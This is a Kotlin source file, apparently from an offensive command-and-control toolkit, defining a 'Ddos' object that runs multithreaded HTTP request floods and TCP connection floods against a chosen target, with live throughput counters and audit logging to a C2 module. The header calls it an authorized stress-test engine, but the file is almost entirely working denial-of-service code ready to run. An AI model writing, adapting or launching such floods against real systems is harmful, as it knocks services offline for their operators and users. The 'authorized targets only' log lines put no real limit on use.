package com.projectzerodays.quantumcli.ops

import com.projectzerodays.quantumcli.QuantumApp
import com.projectzerodays.quantumcli.c2.C2State
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.net.HttpURLConnection
import java.net.InetSocketAddress
import java.net.Socket
import java.net.URL
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

/**
 * Stress-test engine — real socket/HTTP load generation against a target
 * the operator is authorized to test. Two vectors: TCP connection flood
 * (SYN-level pressure via short-lived connects) and HTTP request flood
 * (GET/POST with keep-alive). Throughput, error and connection counters
 * stream live to the UI; everything is audited.
 */
object Ddos {

    data class Stats(
        val sent: Long = 0,
        val ok: Long = 0,
        val errors: Long = 0,
        val rps: Long = 0,
    )

    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()

    private val _stats = MutableStateFlow(Stats())
    val stats: StateFlow<Stats> = _stats.asStateFlow()

    private val stopFlag = AtomicBoolean(false)
    private val sent = AtomicLong(0)
    private val ok = AtomicLong(0)
    private val errors = AtomicLong(0)
    private val perWorker = ConcurrentHashMap<Int, Long>()

    /** HTTP flood — [workers] threads hammering GET/POST at [target] URL. */
    fun startHttp(
        target: String,
        workers: Int = 16,
        durationSec: Int = 30,
        method: String = "GET",
        body: ByteArray? = null,
        scope: kotlinx.coroutines.CoroutineScope = QuantumApp.appScope,
    ) {
        if (_running.value) return
        stopFlag.set(false)
        _running.value = true
        sent.set(0); ok.set(0); errors.set(0)
        C2State.audit("DDOS", "HTTP $method flood start: $target x${workers}w ${durationSec}s — authorized targets only")
        scope.launch(Dispatchers.IO) {
            val jobs = (0 until workers).map { w ->
                launch(Dispatchers.IO) {
                    val endAt = System.currentTimeMillis() + durationSec * 1000L
                    while (isActive && !stopFlag.get() && System.currentTimeMillis() < endAt) {
                        try {
                            val c = URL(target).openConnection() as HttpURLConnection
                            c.requestMethod = method
                            c.connectTimeout = 3000
                            c.readTimeout = 3000
                            c.instanceFollowRedirects = false
                            c.setRequestProperty("User-Agent", "QuantumCLI-stress")
                            if (body != null) {
                                c.doOutput = true
                                c.setFixedLengthStreamingMode(body.size)
                                c.outputStream.use { it.write(body) }
                            }
                            val st = c.responseCode
                            if (st in 200..499) ok.incrementAndGet() else errors.incrementAndGet()
                            c.disconnect()
                        } catch (e: Exception) {
                            errors.incrementAndGet()
                        }
                        sent.incrementAndGet()
                        perWorker[w] = sent.get()
                    }
                }
            }
            jobs.forEach { it.join() }
            _running.value = false
            C2State.audit(
                "DDOS",
                "flood complete: sent=${sent.get()} ok=${ok.get()} err=${errors.get()}"
            )
        }
        // rps sampler
        scope.launch {
            var last = 0L
            while (_running.value) {
                kotlinx.coroutines.delay(1000)
                val cur = sent.get()
                _stats.value = Stats(cur, ok.get(), errors.get(), cur - last)
                last = cur
            }
            _stats.value = Stats(sent.get(), ok.get(), errors.get(), 0)
        }
    }

    /** TCP connect flood — raw short-lived connections against host:port. */
    fun startTcp(
        host: String,
        port: Int,
        workers: Int = 32,
        durationSec: Int = 30,
        scope: kotlinx.coroutines.CoroutineScope = QuantumApp.appScope,
    ) {
        if (_running.value) return
        stopFlag.set(false)
        _running.value = true
        sent.set(0); ok.set(0); errors.set(0)
        C2State.audit("DDOS", "TCP connect flood start: $host:$port x${workers}w ${durationSec}s — authorized targets only")
        scope.launch(Dispatchers.IO) {
            val jobs = (0 until workers).map {
                launch(Dispatchers.IO) {
                    val endAt = System.currentTimeMillis() + durationSec * 1000L
                    while (isActive && !stopFlag.get() && System.currentTimeMillis() < endAt) {
                        try {
                            Socket().use { s ->
                                s.connect(InetSocketAddress(host, port), 2000)
                                ok.incrementAndGet()
                            }
                        } catch (e: Exception) {
                            errors.incrementAndGet()
                        }
                        sent.incrementAndGet()
                    }
                }
            }
            jobs.forEach { it.join() }
            _running.value = false
            C2State.audit("DDOS", "tcp flood complete: sent=${sent.get()} ok=${ok.get()} err=${errors.get()}")
        }
        scope.launch {
            var last = 0L
            while (_running.value) {
                kotlinx.coroutines.delay(1000)
                val cur = sent.get()
                _stats.value = Stats(cur, ok.get(), errors.get(), cur - last)
                last = cur
            }
        }
    }

    fun stop() {
        stopFlag.set(true)
        C2State.audit("DDOS", "flood stopped by operator")
    }
}
